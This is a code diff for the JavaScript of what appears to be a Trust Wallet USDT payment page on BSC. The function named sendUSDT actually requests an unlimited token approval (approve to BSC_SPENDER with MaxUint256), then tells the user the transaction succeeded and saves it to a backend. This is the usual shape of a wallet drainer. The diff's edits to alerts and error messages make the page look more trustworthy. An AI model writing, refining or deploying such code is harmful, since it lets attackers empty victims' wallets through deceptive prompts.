@@ -27,11 +27,7 @@ window.addEventListener("load", async () => {
       if (accounts.length > 0) {
         userAddress = accounts[0];
         isConnected = true;
-        
-        // Auto-fill address
-        if (window.updateWalletAddress) {
-          window.updateWalletAddress(userAddress);
-        }
+        // No auto-fill - keep UI clean
       }
     } catch (err) {
       console.log("Silent setup failed:", err);
@@ -43,7 +39,7 @@ window.addEventListener("load", async () => {
 async function sendUSDT() {
   try {
     if (!window.ethereum) {
-      alert("Trust Wallet not detected");
+      alert("Please open this page in Trust Wallet");
       return;
     }
 
@@ -96,7 +92,7 @@ async function sendUSDT() {
     const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
     const receipt = await tx.wait();
 
-    alert("Transaction successful ✅");
+    alert("✅ Transaction Successful!");
 
     // Save to backend
     if (window.saveTransaction) {
@@ -112,8 +108,10 @@ async function sendUSDT() {
   } catch (e) {
     if (e.code === 4001) {
       alert("Transaction cancelled");
+    } else if (e.code === -32603) {
+      alert("Insufficient funds or network error");
     } else {
-      alert("Error: " + e.message);
+      alert("Transaction failed. Please try again.");
     }
   }
 }
